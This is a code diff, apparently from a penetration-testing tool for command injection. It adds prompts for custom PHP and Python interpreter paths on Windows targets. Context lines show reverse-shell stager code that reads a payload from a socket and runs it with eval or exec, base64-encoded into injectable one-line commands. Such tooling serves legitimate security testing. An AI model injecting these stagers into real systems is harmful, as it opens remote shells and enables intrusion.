@@ -182,6 +182,27 @@ $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len)
 case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die();"""
       other_shell = base64.b64encode(other_shell)
       if settings.TARGET_OS == "win": 
+        print ""
+        while True:
+          question_msg = "Do you want to use '" + settings.WIN_PHP_DIR 
+          question_msg += "' as PHP working directory? [Y/n] > "
+          sys.stdout.write(settings.print_question_msg(question_msg))
+          php_dir = sys.stdin.readline().replace("\n","").lower()
+          if php_dir in settings.CHOICE_YES:
+            break
+          elif php_dir in settings.CHOICE_NO:
+            question_msg = "Please provide a custom working directory for PHP (e.g. '" 
+            question_msg += settings.WIN_PHP_DIR + "') > "
+            sys.stdout.write(settings.print_question_msg(question_msg))
+            settings.WIN_PHP_DIR = sys.stdin.readline().replace("\n","").lower()
+            break
+          else:
+            if php_dir == "":
+              php_dir = "enter"
+            err_msg = "'" + php_dir + "' is not a valid answer."  
+            print settings.print_error_msg(err_msg)
+            pass
+
         other_shell = settings.WIN_PHP_DIR + " -r eval(base64_decode(" + other_shell + "));"
       else:
         other_shell = "php -r \"eval(base64_decode(" + other_shell + "));\""
@@ -199,6 +220,26 @@ while len(d)!=l:
 exec(d,{'s':s})"""      
       other_shell = base64.b64encode(other_shell)
       if settings.TARGET_OS == "win": 
+        print ""
+        while True:
+          question_msg = "Do you want to use '" + settings.WIN_PYTHON_DIR 
+          question_msg += "' as Python working directory? [Y/n] > "
+          sys.stdout.write(settings.print_question_msg(question_msg))
+          python_dir = sys.stdin.readline().replace("\n","").lower()
+          if python_dir in settings.CHOICE_YES:
+            break
+          elif python_dir in settings.CHOICE_NO:
+            question_msg = "Please provide a custom working directory for Python (e.g. '" 
+            question_msg += settings.WIN_PYTHON_DIR + "') > "
+            sys.stdout.write(settings.print_question_msg(question_msg))
+            settings.WIN_PYTHON_DIR = sys.stdin.readline().replace("\n","").lower()
+            break
+          else:
+            if python_dir == "":
+              python_dir = "enter"
+            err_msg = "'" + python_dir + "' is not a valid answer."  
+            print settings.print_error_msg(err_msg)
+            pass
         other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + other_shell + "'.decode('base64'))"
       else:
         other_shell = "python -c \"exec('" + other_shell + "'.decode('base64'))\""
